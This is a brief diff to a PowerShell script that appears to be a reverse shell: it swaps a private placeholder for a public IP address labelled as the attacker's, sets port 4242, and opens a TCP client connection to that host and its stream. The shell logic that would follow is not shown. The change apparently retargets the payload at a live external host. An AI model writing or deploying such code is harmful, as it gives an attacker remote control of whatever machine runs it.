@@ -1,4 +1,4 @@
-$ip = "192.168.1.99"  # Replace with the attacker's IP address
+$ip = "151.248.146.70"  # Replace with the attacker's IP address
 $port = 4242         # Replace with the attacker's listening port
 $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
 $stream = $client.GetStream()
